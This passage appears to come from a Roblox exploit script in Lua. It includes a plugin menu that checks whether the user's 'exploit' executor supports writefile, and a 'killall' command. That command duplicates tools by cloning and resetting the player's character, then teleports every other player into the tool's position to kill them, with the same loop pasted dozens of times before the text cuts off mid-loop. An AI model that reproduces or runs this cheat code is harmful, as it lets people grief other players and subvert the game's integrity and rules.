Settings.Plugins.Select.MouseButton1Click:Connect(function()
	if writefileExploit() then
		PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		disablebuttons()
	else
		notify('Incompatible Exploit','Your exploit is unable to use plugins')
	end
end)

PluginsFrame.Close.MouseButton1Click:Connect(function()
	enablebuttons()
	PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
end)

addcmd('killall',{},
function(args, speaker)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(100, -15, 100))
wait(0.1)
local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 2 - currentamount >= #game.Players:GetPlayers() * 6
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
for _, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Backpack
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()

wait()

for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(.1)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
